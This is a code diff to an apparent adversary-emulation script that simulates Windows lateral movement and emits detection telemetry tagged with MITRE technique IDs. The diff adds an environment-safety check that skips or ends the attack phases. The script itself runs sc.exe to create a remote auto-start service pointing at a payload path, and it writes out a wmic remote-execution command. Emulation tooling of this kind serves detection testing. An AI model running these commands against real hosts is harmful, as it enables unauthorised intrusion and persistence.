@@ -16,7 +16,7 @@ import subprocess
 import sys
 from pathlib import Path
 
-from telemetry_helper import emit, set_phase, jitter
+from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
 
 # Simulated internal network (non-routable)
 INTERNAL_HOSTS = [
@@ -36,6 +36,18 @@ def main() -> int:
     emit("PROCESS", "CREATE_PROCESS", sys.executable, "WARNING",
          source_process="lateral.exe", pid=os.getpid(),
          detail="Lateral movement simulator started")
+
+    env, env_reasons = check_environment()
+    if env_reasons:
+        emit("PROCESS", "ENVIRONMENT_CHECK",
+             os.environ.get("COMPUTERNAME", "unknown"),
+             "WARNING" if env != EnvSafety.CLEAN else "INFO",
+             source_process="lateral.exe",
+             verdict=env.name, reasons=env_reasons)
+    if env == EnvSafety.COMPROMISED:
+        emit("PROCESS", "EXIT_PROCESS", "lateral.exe", "INFO",
+             source_process="lateral.exe", early_exit="COMPROMISED environment")
+        return 0
 
     # --- Phase 1: Network Discovery (host scanning) ---
     set_phase("network_discovery")
@@ -98,72 +110,72 @@ def main() -> int:
          technique_id="T1003.001")
 
     # --- Phase 4: Pass-the-Hash ---
-    set_phase("pass_the_hash")
-    target_ip, target_host = alive_hosts[0] if alive_hosts else ("10.0.0.10", "DC01")
-    emit("NETWORK", "PASS_THE_HASH", f"{target_ip}:{SMB_PORT}", "CRITICAL",
-         source_process="lateral.exe", protocol="NTLM",
-         target_host=target_host, username="Administrator",
-         detail=f"Pass-the-Hash authentication to {target_host}",
-         technique_id="T1550.002")
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
-        s.connect((target_ip, SMB_PORT))
-        s.close()
-    except (ConnectionRefusedError, OSError, socket.timeout):
-        pass
-    jitter(0.3, 0.4)
+    if env != EnvSafety.SUSPICIOUS:
+        set_phase("pass_the_hash")
+        target_ip, target_host = alive_hosts[0] if alive_hosts else ("10.0.0.10", "DC01")
+        emit("NETWORK", "PASS_THE_HASH", f"{target_ip}:{SMB_PORT}", "CRITICAL",
+             source_process="lateral.exe", protocol="NTLM",
+             target_host=target_host, username="Administrator",
+             detail=f"Pass-the-Hash authentication to {target_host}",
+             technique_id="T1550.002")
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((target_ip, SMB_PORT))
+            s.close()
+        except (ConnectionRefusedError, OSError, socket.timeout):
+            pass
+        jitter(0.3, 0.4)
+        emit("NETWORK", "SMB_CONNECT", f"\\\\{target_ip}\\ADMIN$", "CRITICAL",
+             source_process="lateral.exe", protocol="SMB",
+             detail=f"Authenticated access to ADMIN$ on {target_host}",
+             technique_id="T1021.002")
 
-    emit("NETWORK", "SMB_CONNECT", f"\\\\{target_ip}\\ADMIN$", "CRITICAL",
-         source_process="lateral.exe", protocol="SMB",
-         detail=f"Authenticated access to ADMIN$ on {target_host}",
-         technique_id="T1021.002")
+    if env != EnvSafety.SUSPICIOUS:
+        set_phase("remote_execution")
+        emit("PROCESS", "REMOTE_SERVICE", f"\\\\{target_ip}", "CRITICAL",
+             source_process="lateral.exe",
+             detail=f"Creating remote service on {target_host} (sc.exe \\\\{target_host} create)",
+             technique_id="T1569.002")
+        try:
+            subprocess.run(
+                ["sc.exe", f"\\\\{target_ip}", "create", "WinUpdateSvc",
+                 "binPath=", r"C:\Windows\Temp\payload.exe", "start=", "auto"],
+                capture_output=True, timeout=5)
+        except Exception:
+            pass
+        emit("PROCESS", "REMOTE_SERVICE", f"\\\\{target_ip}", "CRITICAL",
+             source_process="lateral.exe",
+             detail=f"Starting remote service on {target_host}",
+             technique_id="T1569.002")
+        jitter(0.3, 0.3)
 
-    # --- Phase 5: Remote Service Creation ---
-    set_phase("remote_execution")
-    emit("PROCESS", "REMOTE_SERVICE", f"\\\\{target_ip}", "CRITICAL",
-         source_process="lateral.exe",
-         detail=f"Creating remote service on {target_host} (sc.exe \\\\{target_host} create)",
-         technique_id="T1569.002")
-    try:
-        subprocess.run(
-            ["sc.exe", f"\\\\{target_ip}", "create", "WinUpdateSvc",
-             "binPath=", r"C:\Windows\Temp\payload.exe", "start=", "auto"],
-            capture_output=True, timeout=5)
-    except Exception:
-        pass
-
-    emit("PROCESS", "REMOTE_SERVICE", f"\\\\{target_ip}", "CRITICAL",
-         source_process="lateral.exe",
-         detail=f"Starting remote service on {target_host}",
-         technique_id="T1569.002")
-    jitter(0.3, 0.3)
-
-    # --- Phase 6: WMI Remote Execution ---
-    set_phase("wmi_execution")
-    second_target = alive_hosts[1] if len(alive_hosts) > 1 else ("10.0.0.20", "FILESERVER")
-    emit("NETWORK", "CONNECT", f"{second_target[0]}:{WMI_PORT}", "CRITICAL",
-         source_process="lateral.exe", protocol="DCOM/WMI",
-         detail=f"WMI connection to {second_target[1]}", technique_id="T1047")
-    emit("PROCESS", "CREATE_PROCESS", "wmic.exe", "CRITICAL",
-         source_process="lateral.exe",
-         command=f"wmic /node:{second_target[0]} process call create 'cmd.exe /c whoami > C:\\temp\\out.txt'",
-         detail=f"Remote command execution via WMI on {second_target[1]}",
-         technique_id="T1047")
-    jitter(0.4, 0.4)
+    if env != EnvSafety.SUSPICIOUS:
+        set_phase("wmi_execution")
+        second_target = alive_hosts[1] if len(alive_hosts) > 1 else ("10.0.0.20", "FILESERVER")
+        emit("NETWORK", "CONNECT", f"{second_target[0]}:{WMI_PORT}", "CRITICAL",
+             source_process="lateral.exe", protocol="DCOM/WMI",
+             detail=f"WMI connection to {second_target[1]}", technique_id="T1047")
+        emit("PROCESS", "CREATE_PROCESS", "wmic.exe", "CRITICAL",
+             source_process="lateral.exe",
+             command=f"wmic /node:{second_target[0]} process call create 'cmd.exe /c whoami > C:\\temp\\out.txt'",
+             detail=f"Remote command execution via WMI on {second_target[1]}",
+             technique_id="T1047")
+        jitter(0.4, 0.4)
 
     # --- Phase 7: Payload Copy to Remote Host ---
-    set_phase("payload_deployment")
-    payload_path = f"\\\\{target_ip}\\ADMIN$\\Temp\\payload.exe"
-    emit("FILE", "CREATE_FILE", payload_path, "CRITICAL",
-         source_process="lateral.exe", size=4096,
-         detail=f"Payload deployed to {target_host} via SMB",
-         technique_id="T1570")
+    if env != EnvSafety.SUSPICIOUS:
+        set_phase("payload_deployment")
+        payload_path = f"\\\\{target_ip}\\ADMIN$\\Temp\\payload.exe"
+        emit("FILE", "CREATE_FILE", payload_path, "CRITICAL",
+             source_process="lateral.exe", size=4096,
+             detail=f"Payload deployed to {target_host} via SMB",
+             technique_id="T1570")
 
     emit("PROCESS", "EXIT_PROCESS", "lateral.exe", "INFO",
          source_process="lateral.exe",
          hosts_discovered=len(alive_hosts),
-         hosts_compromised=2,
+         hosts_compromised=0 if env == EnvSafety.SUSPICIOUS else 2,
          techniques_used=["T1550.002", "T1569.002", "T1047"])
     return 0
 
